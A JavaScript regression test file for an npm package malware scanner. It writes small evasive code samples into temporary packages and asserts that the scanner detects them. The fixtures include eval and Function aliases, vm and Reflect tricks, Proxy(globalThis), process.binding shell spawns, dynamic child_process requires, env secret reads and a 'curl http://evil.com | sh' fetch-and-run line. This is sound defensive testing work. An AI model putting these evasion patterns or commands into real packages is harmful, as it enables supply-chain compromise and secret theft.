const fs = require('fs');
const os = require('os');
const path = require('path');
const { asyncTest, assert, runScanDirect, cleanupTemp } = require('../test-utils');

function makeTempPkg(jsContent, fileName = 'index.js') {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-bypass-'));
  fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-bypass-pkg', version: '1.0.0' }));
  fs.writeFileSync(path.join(tmp, fileName), jsContent);
  return tmp;
}

function hasType(result, type) {
  return (result.threats || []).some(t => t.type === type);
}

function hasSeverity(result, severity) {
  return (result.threats || []).some(t => t.severity === severity);
}

async function runAstBypassRegressionTests() {
  console.log('\n=== AST BYPASS REGRESSION TESTS ===\n');
  // These tests document bypasses that are NOW detected (Batch 1).

  await asyncTest('BYPASS-REG: vm.runInThisContext(payload) — detected', async () => {
    const tmp = makeTempPkg(`
const vm = require('vm');
const payload = Buffer.from('Y29uc29sZS5sb2coImV4ZWMiKQ==', 'base64').toString();
vm.runInThisContext(payload);
`);
    try {
      const result = await runScanDirect(tmp);
      const detected = hasType(result, 'vm_code_execution');
      assert(detected, 'vm.runInThisContext should be detected as vm_code_execution');
    } finally {
      cleanupTemp(tmp);
    }
  });

  await asyncTest('BYPASS-REG: vm.runInNewContext(code, ctx) — detected', async () => {
    const tmp = makeTempPkg(`
const vm = require('vm');
const code = 'process.env.SECRET';
const ctx = { process };
vm.runInNewContext(code, ctx);
`);
    try {
      const result = await runScanDirect(tmp);
      const detected = hasType(result, 'vm_code_execution');
      assert(detected, 'vm.runInNewContext should be detected as vm_code_execution');
    } finally {
      cleanupTemp(tmp);
    }
  });

  await asyncTest('BYPASS-REG: Reflect.construct(Function, [code]) — detected', async () => {
    const tmp = makeTempPkg(`
const code = 'return process.env.SECRET';
const fn = Reflect.construct(Function, [code]);
fn();
`);
    try {
      const result = await runScanDirect(tmp);
      const detected = hasType(result, 'reflect_code_execution');
      assert(detected, 'Reflect.construct(Function) should be detected as reflect_code_execution');
    } finally {
      cleanupTemp(tmp);
    }
  });

  await asyncTest('BYPASS-REG: Reflect.apply(eval, null, [code]) — detected', async () => {
    const tmp = makeTempPkg(`
const code = 'process.env.SECRET';
Reflect.apply(eval, null, [code]);
`);
    try {
      const result = await runScanDirect(tmp);
      const detected = hasType(result, 'reflect_code_execution');
      assert(detected, 'Reflect.apply(eval) should be detected as reflect_code_execution');
    } finally {
      cleanupTemp(tmp);
    }
  });

  await asyncTest('BYPASS-REG: process.binding("spawn_sync") — detected', async () => {
    const tmp = makeTempPkg(`
const binding = process.binding('spawn_sync');
binding.spawn({ file: '/bin/sh', args: ['-c', 'whoami'] });
`);
    try {
      const result = await runScanDirect(tmp);
      const detected = hasType(result, 'process_binding_abuse');
      assert(detected, 'process.binding("spawn_sync") should be detected as process_binding_abuse');
    } finally {
      cleanupTemp(tmp);
    }
  });

  await asyncTest('BYPASS-REG: process._linkedBinding("spawn_sync") — detected', async () => {
    const tmp = makeTempPkg(`
const binding = process._linkedBinding('spawn_sync');
binding.spawn({ file: '/bin/sh', args: ['-c', 'id'] });
`);
    try {
      const result = await runScanDirect(tmp);
      const detected = hasType(result, 'process_binding_abuse');
      assert(detected, 'process._linkedBinding("spawn_sync") should be detected as process_binding_abuse');
    } finally {
      cleanupTemp(tmp);
    }
  });

  // --- Batch 2 regression anchors ---

  await asyncTest('BYPASS-REG-B2: require("node:child_process").execSync — detected', async () => {
    const tmp = makeTempPkg(`
const cp = require('node:child_process');
cp.execSync('curl http://evil.com | sh');
`);
    try {
      const result = await runScanDirect(tmp);
      const detected = hasType(result, 'dangerous_exec');
      assert(detected, 'require("node:child_process").execSync should be detected');
    } finally {
      cleanupTemp(tmp);
    }
  });

  await asyncTest('BYPASS-REG-B2: cp["execSync"]("curl | sh") bracket notation — detected', async () => {
    const tmp = makeTempPkg(`
const cp = require('child_process');
cp['execSync']('curl http://evil.com | sh');
`);
    try {
      const result = await runScanDirect(tmp);
      const detected = result.threats.some(t => t.type === 'dangerous_exec');
      assert(detected, 'cp["execSync"]("curl | sh") bracket notation should be detected');
    } finally {
      cleanupTemp(tmp);
    }
  });

  await asyncTest('BYPASS-REG-B2: (false || eval)(code) — detected', async () => {
    const tmp = makeTempPkg(`
const code = "process.env.SECRET";
(false || eval)(code);
`);
    try {
      const result = await runScanDirect(tmp);
      const detected = hasType(result, 'dangerous_call_eval');
      assert(detected, '(false || eval)() should be detected as dangerous_call_eval');
    } finally {
      cleanupTemp(tmp);
    }
  });

  await asyncTest('BYPASS-REG-B2: const { SECRET_KEY } = process.env — detected', async () => {
    const tmp = makeTempPkg(`const { SECRET_KEY } = process.env;`);
    try {
      const result = await runScanDirect(tmp);
      const detected = hasType(result, 'env_access');
      assert(detected, 'const { SECRET_KEY } = process.env should be detected as env_access');
    } finally {
      cleanupTemp(tmp);
    }
  });

  await asyncTest('BYPASS-REG-B2: new Worker(code, { eval: true }) — detected', async () => {
    const tmp = makeTempPkg(`
const { Worker } = require('worker_threads');
new Worker('require("child_process").execSync("id")', { eval: true });
`);
    try {
      const result = await runScanDirect(tmp);
      const detected = hasType(result, 'worker_thread_exec');
      assert(detected, 'new Worker(code, {eval:true}) should be detected as worker_thread_exec');
    } finally {
      cleanupTemp(tmp);
    }
  });

  // =============================================
  // v2.5.14: B1 — eval alias bypass detection
  // =============================================

  await asyncTest('BYPASS-REG B1: const E = eval; E(code) — detected', async () => {
    const tmp = makeTempPkg(`
const E = eval;
E('require("child_process").execSync("id")');
`);
    try {
      const result = await runScanDirect(tmp);
      const detected = hasType(result, 'dangerous_call_eval');
      assert(detected, 'const E = eval; E() should be detected as dangerous_call_eval');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('BYPASS-REG B1: const E = (x) => eval(x); E(code) — detected', async () => {
    const tmp = makeTempPkg(`
const E = (x) => eval(x);
E('require("child_process").execSync("id")');
`);
    try {
      const result = await runScanDirect(tmp);
      const detected = hasType(result, 'dangerous_call_eval');
      assert(detected, 'Arrow function eval wrapper should be detected');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('BYPASS-REG B1: const F = function(x) { return eval(x); }; F(code) — detected', async () => {
    const tmp = makeTempPkg(`
const F = function(x) { return eval(x); };
F('process.env.SECRET');
`);
    try {
      const result = await runScanDirect(tmp);
      const detected = hasType(result, 'dangerous_call_eval');
      assert(detected, 'Function expression eval wrapper should be detected');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('BYPASS-REG B1: const F = Function; F(code) — detected', async () => {
    const tmp = makeTempPkg(`
const F = Function;
const fn = F('return process.env.TOKEN');
`);
    try {
      const result = await runScanDirect(tmp);
      const detected = hasType(result, 'dangerous_call_function');
      assert(detected, 'const F = Function; F() should be detected as dangerous_call_function');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('BYPASS-REG B1 negative: const L = console.log; L() — NOT eval alias', async () => {
    const tmp = makeTempPkg(`
const L = console.log;
L('hello world');
`);
    try {
      const result = await runScanDirect(tmp);
      const evalThreats = (result.threats || []).filter(t => t.type === 'dangerous_call_eval' && t.message.includes('alias'));
      assert(evalThreats.length === 0, 'console.log alias should NOT be detected as eval alias');
    } finally { cleanupTemp(tmp); }
  });

  // =============================================
  // v2.5.14: B2 — globalThis indirect assignment
  // =============================================

  await asyncTest('BYPASS-REG B2: const g = globalThis; g.fetch = fn — detected', async () => {
    const tmp = makeTempPkg(`
const g = globalThis;
g.fetch = function(url) { return originalFetch(url); };
`);
    try {
      const result = await runScanDirect(tmp);
      const detected = hasType(result, 'prototype_hook');
      assert(detected, 'globalThis alias g.fetch override should be detected as prototype_hook');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('BYPASS-REG B2 negative: const g = globalThis; g.myCustomProp = fn — NOT detected', async () => {
    const tmp = makeTempPkg(`
const g = globalThis;
g.myCustomProp = function() { return 42; };
`);
    try {
      const result = await runScanDirect(tmp);
      const hookThreats = (result.threats || []).filter(t =>
        t.type === 'prototype_hook' && t.message.includes('myCustomProp'));
      assert(hookThreats.length === 0, 'Custom property on globalThis alias should NOT be detected as prototype_hook');
    } finally { cleanupTemp(tmp); }
  });

  // =============================================
  // v2.5.14: B5 — require(obj.prop) resolution
  // =============================================

  await asyncTest('BYPASS-REG B5: const o = {m:"child_process"}; require(o.m) — CRITICAL', async () => {
    const tmp = makeTempPkg(`
const o = { m: 'child_process' };
const cp = require(o.m);
cp.execSync('id');
`);
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t =>
        t.type === 'dynamic_require' && t.severity === 'CRITICAL' && t.message.includes('child_process'));
      assert(t, 'require(o.m) resolving to child_process should be CRITICAL dynamic_require');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('BYPASS-REG B5: const o = {m:"lodash"}; require(o.m) — HIGH (non-dangerous)', async () => {
    const tmp = makeTempPkg(`
const o = { m: 'lodash' };
const _ = require(o.m);
`);
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t =>
        t.type === 'dynamic_require' && t.severity === 'CRITICAL');
      assert(!t, 'require(o.m) with lodash should NOT be CRITICAL');
      const h = (result.threats || []).find(t => t.type === 'dynamic_require');
      assert(h, 'require(o.m) with any member expression should still be HIGH dynamic_require');
    } finally { cleanupTemp(tmp); }
  });

  // =============================================
  // v2.5.14: Variable reassignment tracking
  // =============================================

  await asyncTest('BYPASS-REG: let x = "child_"; x += "process"; require(x) — CRITICAL', async () => {
    const tmp = makeTempPkg(`
let x = 'child_';
x += 'process';
const cp = require(x);
cp.execSync('id');
`);
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t =>
        t.type === 'dynamic_require' && t.severity === 'CRITICAL' && t.message.includes('child_process'));
      assert(t, 'Variable reassignment to child_process should be CRITICAL dynamic_require');
    } finally { cleanupTemp(tmp); }
  });
  // =============================================
  // ANSSI v4 audit: Bypass fixes
  // =============================================

  // Bypass 1: Proxy(globalThis) — direct detection
  await asyncTest('BYPASS-REG: new Proxy(globalThis, {get}) — detected as proxy_globalthis_intercept', async () => {
    const tmp = makeTempPkg(`
const p = new Proxy(globalThis, {
  get(target, prop) { return target[prop]; }
});
p.eval('require("child_process").execSync("id")');
`);
    try {
      const result = await runScanDirect(tmp);
      const detected = hasType(result, 'proxy_globalthis_intercept');
      assert(detected, 'new Proxy(globalThis) should be detected as proxy_globalthis_intercept');
    } finally { cleanupTemp(tmp); }
  });

  // Bypass 1: Proxy(global alias) — detection via ctx.globalThisAliases
  await asyncTest('BYPASS-REG: const g = global; new Proxy(g, handler) — detected via alias', async () => {
    const tmp = makeTempPkg(`
const g = global;
const p = new Proxy(g, { get(t, k) { return t[k]; } });
`);
    try {
      const result = await runScanDirect(tmp);
      const detected = hasType(result, 'proxy_globalthis_intercept');
      assert(detected, 'new Proxy(globalAlias) should be detected via ctx.globalThisAliases');
    } finally { cleanupTemp(tmp); }
  });

  // Bypass 1: Proxy(globalThis) alias propagation — p["eval"] detected downstream
  await asyncTest('BYPASS-REG: Proxy(globalThis) + p["eval"](code) — eval detected via alias propagation', async () => {
    const tmp = makeTempPkg(`
const p = new Proxy(globalThis, { get(t,k) { return t[k]; } });
p['eval']('process.env.SECRET');
`);
    try {
      const result = await runScanDirect(tmp);
      const evalDetected = hasType(result, 'dangerous_call_eval');
      assert(evalDetected, 'p["eval"]() after Proxy(globalThis) should be detected as dangerous_call_eval via globalThisAliases');
    } finally { cleanupTemp(tmp); }
  });

  // Bypass 2: Reflect.apply(Function.prototype.bind, Function, [...])
  await asyncTest('BYPASS-REG: Reflect.apply(Function.prototype.bind, Function, [...]) — detected', async () => {
    const tmp = makeTempPkg(`
const fn = Reflect.apply(Function.prototype.bind, Function, [null, 'return process.env.SECRET']);
fn()();
`);
    try {
      const result = await runScanDirect(tmp);
      const detected = hasType(result, 'reflect_bind_code_execution');
      assert(detected, 'Reflect.apply(Function.prototype.bind, Function) should be detected');
    } finally { cleanupTemp(tmp); }
  });

  // Bypass 2: .call variant
  await asyncTest('BYPASS-REG: Reflect.apply(Function.prototype.call, Function, [...]) — detected', async () => {
    const tmp = makeTempPkg(`
Reflect.apply(Function.prototype.call, Function, [null, 'return process.env.SECRET']);
`);
    try {
      const result = await runScanDirect(tmp);
      const detected = hasType(result, 'reflect_bind_code_execution');
      assert(detected, 'Reflect.apply(Function.prototype.call, Function) should be detected');
    } finally { cleanupTemp(tmp); }
  });

  // Bypass 2: .apply variant with eval
  await asyncTest('BYPASS-REG: Reflect.apply(Function.prototype.apply, eval, [...]) — detected', async () => {
    const tmp = makeTempPkg(`
Reflect.apply(Function.prototype.apply, eval, [null, ['process.env.SECRET']]);
`);
    try {
      const result = await runScanDirect(tmp);
      const detected = hasType(result, 'reflect_bind_code_execution');
      assert(detected, 'Reflect.apply(*.apply, eval) should be detected');
    } finally { cleanupTemp(tmp); }
  });
}

module.exports = { runAstBypassRegressionTests };
